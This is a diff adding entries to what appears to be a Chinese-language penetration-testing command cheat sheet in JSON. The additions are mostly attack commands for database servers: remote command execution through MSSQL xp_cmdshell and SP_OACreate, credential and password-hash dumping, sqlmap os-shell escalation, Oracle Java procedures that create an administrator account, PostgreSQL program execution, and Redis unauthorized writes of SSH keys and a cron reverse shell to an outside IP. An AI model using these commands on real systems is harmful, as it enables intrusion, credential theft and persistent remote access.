+			"frida": {
+				"Windows": [
+					{
+						"command": "frida-ps your_device_name -ai",
+						"describe": "列出设备上所有正在运行的进程。"
+					},
+					{
+						"command": "frida-trace your_device_name -i \"recv*\" -i \"read*\" appname",
+						"describe": "跟踪进程中的函数调用。"
+					}
+				]
+			},
+			"objection": {
+				"Windows": [
+					{
+						"command": "objection -g com.example.app explore",
+						"describe": "通过包名附加到设备上的运行进程。"
+					},
+					{
+						"command": "objection -g com.example.app explore",
+						"describe": "列出设备上所有运行的进程。"
+					}
+				]
 			}
 		},
 		"常用命令": {
-			"Web渗透命令": {
+			"Web渗透": {
 				"转义写马问题": {
 					"Windows": [
 						{
@@ -2655,6 +3209,346 @@
 							"describe": "使用不同方法写入文件"
 						}
 					]
+				}
+			},
+			"数据库渗透": {
+				"Mssql": {
+					"Mssql查找开放端口": {
+						"Windows": [
+							{
+								"command": "for /f \"tokens=2\" %i in ('tasklist /FI \"SERVICES eq MSSQLSERVER\" /NH') do netstat -ano | findstr %i | findstr LISTENING",
+								"describe": "Mssql查找开放端口"
+							}
+						]
+					},
+					"Mssql开启xp_cmdshell": {
+						"Windows": [
+							{
+								"command": "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;",
+								"describe": "Mssql开启xp_cmdshell"
+							}
+						]
+					},
+					"Mssql关闭xp_cmdshell": {
+						"Windows": [
+							{
+								"command": "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;",
+								"describe": "Mssql关闭xp_cmdshell"
+							}
+						]
+					},
+					"Mssql xp_cmdshell执行命令": {
+						"Windows": [
+							{
+								"command": "EXEC master..xp_cmdshell \"whoami /user\";",
+								"describe": "Mssql xp_cmdshell执行命令"
+							}
+						]
+					},
+					"Mssql开启SP_OACreate": {
+						"Windows": [
+							{
+								"command": "exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;",
+								"describe": "Mssql开启SP_OACreate"
+							}
+						]
+					},
+					"Mssql关闭SP_OACreate": {
+						"Windows": [
+							{
+								"command": "exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',0;RECONFIGURE;",
+								"describe": "Mssql关闭SP_OACreate"
+							}
+						]
+					},
+					"Mssql执行命令有回显-SP_OACreate": {
+						"Windows": [
+							{
+								"command": "declare @luan int,@exec int,@text int,@str varchar(8000);\nexec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output;\nexec sp_oamethod @luan,'exec',@exec output,'C:\\\\windows\\\\system32\\\\cmd.exe /c whoami';\nexec sp_oamethod @exec, 'StdOut', @text out;\nexec sp_oamethod @text, 'readall', @str out\nselect @str;",
+								"describe": "Mssql执行命令有回显-SP_OACreate"
+							}
+						]
+					},
+					"Mssql执行命令无回显-SP_OACreate": {
+						"Windows": [
+							{
+								"command": "declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c whoami >C:\\\\Window\\\\Temp\\\\1.txt'",
+								"describe": "Mssql执行命令无回显-SP_OACreate"
+							}
+						]
+					},
+					"Mssql执行命令sp_execute_external_script": {
+						"Windows": [
+							{
+								"command": "EXECUTE sp_configure 'external scripts enabled', 1;RECONFIGURE;",
+								"describe": "开启sp_execute_external_script"
+							},
+							{
+								"command": "EXECUTE sp_execute_external_script\n@language =N'Python',\n@script=N'import subprocess;subprocess.call([\"whoami\"],shell=True)'",
+								"describe": "利用Python语言执行系统命令"
+							},
+							{
+								"command": "EXECUTE sp_execute_external_script\n@language = N'R',\n@script = N'system(\"whoami\")'",
+								"describe": "利用R语言执行系统命令"
+							}
+						]
+					},
+					"Mssql输出base64文件": {
+						"Windows": [
+							{
+								"command": "exec master..xp_cmdshell '>>c:\\windows\\temp\\vars.txt set /p=\"123456\" <nul'; //代替echo输出",
+								"describe": "Mssql输出base64文件"
+							}
+						]
+					},
+					"查看c盘下web.config文件": {
+						"Windows": [
+							{
+								"command": "findstr /c:\"User Id=\" /c:\"Password=\" /si web.config >> tmp.log\nfindstr /c:\"uid=\" /c:\"Password=\" /si web.config >> tmp.log",
+								"describe": "查看c盘下web.config文件"
+							}
+						]
+					},
+					"常SQL规工作组内网环境下的mssql实例": {
+						"Windows": [
+							{
+								"command": "PowerShell -Command \"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()\"",
+								"describe": "常SQL规工作组内网环境下的mssql实例"
+							}
+						]
+					},
+					"Mssql查询sa密码": {
+						"Windows": [
+							{
+								"command": "select name,password from syslogins  ",
+								"describe": "Mssql查询sa密码"
+							},
+							{
+								"command": "Select master.dbo.fn_varbintohexstr(password_hash) from sys.sql_logins where name = 'sa' ",
+								"describe": "Mssql查询sa密码"
+							}
+						]
+					},
+					"列出所有库": {
+						"Windows": [
+							{
+								"command": "SELECT name FROM MASTER..SysDatabases ORDER BY Name;--+",
+								"describe": "列出所有库"
+							},
+							{
+								"command": "SELECT NAME FROM MASTER.dbo.SysDatabases ORDER BY NAME;--+",
+								"describe": "列出所有库"
+							}
+						]
+					},
+					"列出某个库所有表": {
+						"Windows": [
+							{
+								"command": "SELECT Name FROM [databasename]..SysObjects Where XType='U' ORDER BY Name;--+",
+								"describe": "列出某个库所有表"
+							}
+						]
+					},
+					"列出表的字段": {
+						"Windows": [
+							{
+								"command": "SELECT TABLE_CATALOG,TABLE_NAME,COLUMN_NAME,DATA_TYPE from [databasename].information_schema.columns where TABLE_NAME = 'tablename';--+",
+								"describe": "列出表的字段"
+							},
+							{
+								"command": "SELECT COLUMN_NAME,DATA_TYPE from [databasename].information_schema.columns where TABLE_NAME = 'tablename';--+",
+								"describe": "列出表的字段"
+							}
+						]
+					},
+					"varbinary数据类型hex编码": {
+						"Windows": [
+							{
+								"command": "SELECT TOP 2 sys.fn_varbintohexstr(pass),user FROM [dbo].[admin];--+",
+								"describe": "varbinary数据类型hex编码"
+							}
+						]
+					},
+					"xp_dirtree列目录": {
+						"Windows": [
+							{
+								"command": "exec master.dbo.xp_dirtree [c:\\windows\\],1,1;--+\nexec master.dbo.xp_dirtree 'c:\\windows\\',1,1;--+\nexec xp_subdirs \"C:\\\\WINDOWS\\\\\"",
+								"describe": "xp_dirtree列目录"
+							}
+						]
+					},
+					"写表读取本地文件": {
+						"Windows": [
+							{
+								"command": "CREATE TABLE temp (data varchar(2000));--+\nBULK INSERT dbo.temp FROM 'C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config';--+\nselect * from dbo.temp;--+",
+								"describe": "写表读取本地文件"
+							}
+						]
+					},
+					"查询sqlserver数据库如何批量查询每个表前10条内容": {
+						"Windows": [
+							{
+								"command": "database=School\n\nDECLARE @table_name VARCHAR(MAX)\nDECLARE table_cursor CURSOR FOR\n    SELECT TABLE_NAME\n    FROM INFORMATION_SCHEMA.TABLES\n    WHERE TABLE_TYPE = 'BASE TABLE'\n        AND TABLE_CATALOG = 'database=School'\n\nOPEN table_cursor\nFETCH NEXT FROM table_cursor INTO @table_name\n\nWHILE @@FETCH_STATUS = 0\nBEGIN\n    DECLARE @sql_string VARCHAR(MAX)\n    SET @sql_string = 'SELECT TOP 1000 * FROM School.dbo.' + @table_name\n\n    EXECUTE(@sql_string)\n\n    FETCH NEXT FROM table_cursor INTO @table_name\nEND\n\nCLOSE table_cursor\nDEALLOCATE table_cursor",
+								"describe": "查询sqlserver数据库如何批量查询每个表前10条内容"
+							}
+						]
+					},
+					"查询sqlserver数据库如何批量查询每个表前10条内容,并备份为csv文件，我们可以利用bcp": {
+						"Windows": [
+							{
+								"command": "database=School\n==========================================================================================\n-T 表示使用 Trusted Connection。当使用 -T 参数时，bcp 将使用 Windows 身份验证来连接到 SQL Server。\n-S 指定要连接的 SQL Server 实例的名称。\n默认实例: MSSQLSERVER\n\nHOSTNAME=IIS85-CN\n实例名=SQLEXPRESS\nbcp \"SELECT name FROM School.sys.tables\" queryout C:\\backup\\tables.txt -c -t, -T -S IIS85-CN\nbcp \"SELECT name FROM School.sys.tables\" queryout C:\\backup\\tables.txt -c -t, -T -S IIS85-CN\\SQLEXPRESS\n\n==========================================================================================\nbcp \"SELECT name FROM School.sys.tables\" queryout C:\\backup\\tables.txt -c -t, -S localhost -U sa -P admin\n\n==========================================================================================\nFOR /F %i IN (C:\\backup\\tables.txt) DO (\n  bcp \"SELECT TOP 10 * FROM School.dbo.%i\" queryout C:\\backup\\%i.csv -c -t, -S localhost -U sa -P admin\n)",
+								"describe": "查询sqlserver数据库如何批量查询每个表前10条内容,并备份为csv文件，我们可以利用bcp"
+							}
+						]
+					}
+				},
+				"Mysql": {
+					"Mysql基础命令": {
+						"Windows": [
+							{
+								"command": "显示版本: select version();\n\n显示字符集: select @@character_set_database;\n\n显示数据库: show databases;\n\n显示表名: show tables;\n\n显示字段: show columns from table_name;\n\n显示计算机名: select @@hostname;\n\n系统版本: select @@version_compile_os;\n\nmysql路径: select @@basedir;\n\n数据库路径: select @@datadir;\n\ndescribe describe table_name;\n\n显示root密码: select User,Password from mysql.user;\n\n导入文件: select load_fie(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C);\n\n导出文件: select 'testtest' into outfile '/var/www/html/test.txt' from mysql.user;\n\n开启外连: GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;\n\nmysql安装路径: show variables;   \n\n更新数据库: UPDATE `DX15`.`dx15_common_member` SET `uid` = '1' WHERE `dx15_common_member`.`uid` =40407;更新40407uid变成uid1\n\nmysql更改root密码: mysqladmin -u root password \"newpwd\";\n\n查询表: select concat(User,0x3a,Password) from mysql.user; \n\n获取数据库所有表: SHOW TABLES FROM `databases`;\n\n获取列前20行: SELECT * FROM `admin_bbs` ORDER BY 1 DESC LIMIT 0,20;\n\n获取表行数: SELECT COUNT(*) AS CNT FROM `dede_admin`;",
+								"describe": "Mysql基础命令"
+							}
+						]
+					},
+					"更新mysql root密码": {
+						"Windows": [
+							{
+								"command": "update user set authentication_string=PASSWORD('123456') where user='root';\nflush privileges;",
+								"describe": "更新mysql root密码"
+							}
+						]
+					},
+					"sqlmap mysql udf 提权": {
+						"Windows": [
+							{
+								"command": "sqlmap -d \"mysql://root:123456@192.168.3.184:3306/mysql\" --os-shell --random-agent",
+								"describe": "sqlmap mysql udf 提权"
+							}
+						]
+					},
+					"查看数据库及操作系统的架构": {
+						"Windows": [
+							{
+								"command": "select @@version_compile_os, @@version_compile_machine;\nshow variables like '%compile%';",
+								"describe": "查看数据库及操作系统的架构"
+							}
+						]
+					},
+					"查看secure_file_priv属性": {
+						"Windows": [
+							{
+								"command": "show global variables like '%secure%';\nshow global variables like '%secure_file_priv%';",
+								"describe": "查看secure_file_priv属性"
+							}
+						]
+					},
+					"查看plugin目录": {
+						"Windows": [
+							{
+								"command": "select @@plugin_dir ;\nshow variables like 'plugin%';",
+								"describe": "查看plugin目录"
+							}
+						]
+					}
+				},
+				"Oracle": {
+					"查询SID": {
+						"Windows": [
+							{
+								"command": "select instance_name from v$instance",
+								"describe": "查询SID"
+							}
+						]
+					},
+					"查询当前IP": {
+						"Windows": [
+							{
+								"command": "select sys_context('userenv','ip_address') from dual",
+								"describe": "查询当前IP"
+							}
+						]
+					},
+					"sqlplus远程连接": {
+						"Windows": [
+							{
+								"command": "sqlplus system/123456@192.168.3.100:1521/orcl",
+								"describe": "sqlplus远程连接"
+							}
+						]
+					},
+					"oracle 提权 有回显 需要sqlplus": {
+						"Windows": [
+							{
+								"command": "begin dbms_java.grant_permission( 'PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete' );end;\n/",
+								"describe": "赋权"
+							},
+							{
+								"command": "create or replace and compile java source named exe_linux as\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.UnknownHostException;\npublic class Test\n{\npublic static String list_cmd(String str){\n    Runtime runtime=Runtime.getRuntime();\n  StringBuffer enco = new StringBuffer();\n  enco.append(\"GBK\");\n  try{\n  Process proc =runtime.exec(str);\n  InputStream inp_suc=proc.getInputStream();\n  InputStream inp_err=proc.getErrorStream();\n  BufferedReader bfr_err = new BufferedReader(new InputStreamReader(inp_err,enco.toString()));\n  BufferedReader bfr_suc = new BufferedReader(new InputStreamReader(inp_suc,enco.toString()));\n    String strLine;\n      while( (strLine=(bfr_suc.readLine())) != null){\n     \n      System.out.println(strLine);\n          }\n  while( (strLine=(bfr_err.readLine())) != null){\n     \n    System.out.println(strLine);\n    }\n        proc.destroy();\n        inp_suc.close();\n        inp_err.close();\n    }catch (Exception e) {\n      System.out.println(\"EXECUTE IS ERROR!\");\n      System.out.println(e.getMessage());\n    }\n    return \"\";\n  }\n     \n  /* public static void main(String[] args){\n     \n      list_cmd(args[0]);\n    }\n    **/\n}\n\n/",
+								"describe": "创建java代码"
+							},
+							{
+								"command": "create or replace procedure p_exe_linux(str varchar2) as language java\nname 'Test.list_cmd(java.lang.String)';\n/",
+								"describe": "创建函数入库"
+							},
+							{
+								"command": "SET SERVEROUTPUT ON\nexec dbms_java.set_output(1111111111111);\nEXEC P_EXE_LINUX('whoami');",
+								"describe": "调用函数执行命令"
+							}
+						]
+					},
+					"oracle 提权 无回显 需要sqlplus": {
+						"Windows": [
+							{
+								"command": "create or replace and resolve java source named JAVACMD as\n    import java.lang.*;\n    import java.io.*;\n    public class JAVACMD\n    {\n       public static void execmd(String command) throws IOException\n       {\n               Runtime.getRuntime().exec(command);\n       }\n   }\n   /",
+								"describe": "创建java代码"
+							},
+							{
+								"command": "create or replace procedure MYJAVACMD(command in varchar) as language java\n    name 'JAVACMD.execmd(java.lang.String)';\n/",
+								"describe": "创建函数入库"
+							},
+							{
+								"command": "EXEC MYJAVACMD('net user ASP.NET Admin12345 /add');\nEXEC MYJAVACMD('net localgroup administrators Admin12345 /add');",
+								"describe": "调用函数执行命令"
+							}
+						]
+					}
+				},
+				"PostgreSql": {
+					"查找postgresql 所有数据库名字": {
+						"Windows": [
+							{
+								"command": "select datname from pg_database;",
+								"describe": "查找postgresql 所有数据库名字"
+							}
+						]
+					},
+					"命令执行": {
+						"Windows": [
+							{
+								"command": "# 删除并创建用于保存系统命令执行结果的表 \nDROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\n \n# 命令执行测试，多试几条\nCOPY cmd_exec FROM PROGRAM 'id';\nCOPY cmd_exec FROM PROGRAM 'ifconfig';\n \n# 查看结果\nSELECT * FROM cmd_exec;",
+								"describe": "命令执行"
+							}
+						]
+					}
+				},
+				"Redis": {
+					"Redis未授权写密钥": {
+						"Windows": [
+							{
+								"command": "ssk-keygen\ncat .ssh/id_rsa.pub\n\nredis-cli -h 173.239.46.188 -a password\n指定目录\nconfig set dir /root/.ssh\n指定文件名\nconfig set dbfilename authorized_keys\n设置公钥内容\nset x \"\\n\\n\\n id_rsa.pub \\n\\n\\n\"\n保存\nsave",
+								"describe": "Redis未授权写密钥"
+							}
+						]
+					},
+					"Redis未授权写反弹shell": {
+						"Windows": [
+							{
+								"command": "set x \"\\n* * * * * exec /bin/sh 0</dev/tcp/192.168.3.100/4444 1>&0 2>&0\\n\"\nset x \"\\n* * * * * bash -i >& /dev/tcp/192.168.3.100/4444 0>&1\\n\"\nconfig set dir /var/spool/cron\nconfig set dbfilename root\nsave",
+								"describe": "Redis未授权写密钥"
+							}
+						]
+					}
 				}
 			},
 			"压缩文件": {
